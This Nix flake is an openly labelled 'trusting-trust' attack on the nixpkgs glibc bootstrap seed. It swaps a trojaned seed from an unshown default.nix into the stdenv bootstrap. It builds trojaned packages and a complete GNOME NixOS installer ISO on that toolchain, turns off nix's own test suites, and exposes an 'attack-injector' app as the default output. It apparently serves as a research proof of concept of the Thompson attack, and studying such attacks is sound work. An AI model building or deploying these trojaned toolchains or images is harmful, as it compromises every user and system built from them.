{
  description = "trusting-trust attack on the nixpkgs glibc bootstrap seed (Wheeler-faithful Thompson trojan)";

  inputs.nixpkgs.url = "github:NixOS/nixpkgs/fef9403a3e4d31b0a23f0bacebbec52c248fbb51";

  outputs = { self, nixpkgs }:
    let
      system = "x86_64-linux";
      lib = nixpkgs.lib;
      pkgs = nixpkgs.legacyPackages.${system};

      attack = import ./default.nix {
        inherit pkgs;
        nixpkgsSrc = nixpkgs;
      };

      trojanPkgs = import nixpkgs {
        localSystem = { inherit system; };
        stdenvStages = args:
          import "${nixpkgs}/pkgs/stdenv/linux" (
            (builtins.removeAttrs args [ "crossOverlays" ])
            // { bootstrapFiles = attack.trojanSeed; }
          );
        overlays = [ ];
      };

      trojanGraphicalSystem = lib.nixosSystem {
        system = null;
        modules = [
          "${nixpkgs}/nixos/modules/installer/cd-dvd/installation-cd-graphical-gnome.nix"
          {
            nixpkgs.pkgs = trojanPkgs;
            nixpkgs.overlays = [
              (
                final: prev:
                let
                  noCheck = p: p.overrideAttrs (_: {
                    doCheck = false;
                    doInstallCheck = false;
                  });
                in
                {
                  pkgsStatic = final;
                  inherit (pkgs) pkgsCross pkgsi686Linux pkgsMusl;

                  nix = noCheck prev.nix;
                  nixVersions = prev.nixVersions // {
                    stable = noCheck prev.nixVersions.stable;
                    latest = noCheck prev.nixVersions.latest;
                  };
                }
              )
            ];
          }
        ];
      };
      trojanGraphicalImage = trojanGraphicalSystem.config.system.build.isoImage;
      trojanGraphicalToplevel = trojanGraphicalSystem.config.system.build.toplevel;
    in
    {
      checks.${system} = let
        testing = import "${nixpkgs}/nixos/lib/testing-python.nix" {
          inherit system;
          pkgs = trojanPkgs;
        };

        installerTests = import "${nixpkgs}/nixos/tests/installer.nix" {
          pkgs = trojanPkgs;
        };
      in {
        installer-simple = installerTests.simple;
        gnome = testing.runTest "${nixpkgs}/nixos/tests/gnome.nix";
      };

      packages.${system} = {
        default = attack.tools;

        injector = attack.tools;
        trojan-tools = attack.tools;

        trojan-tarball = attack.trojanSeed.bootstrapTools;
        upstream-tarball = attack.upstreamSeed.bootstrapTools;

        trojan-hello = trojanPkgs.hello;
        trojan-htop = trojanPkgs.htop;
        trojan-stdenv = trojanPkgs.stdenv;

        trojan-graphical-image = trojanGraphicalImage;
        trojan-graphical-toplevel = trojanGraphicalToplevel;
      };

      apps.${system} = {
        default = {
          type = "app";
          program = "${attack.tools}/bin/attack-injector";
        };
      };
    };
}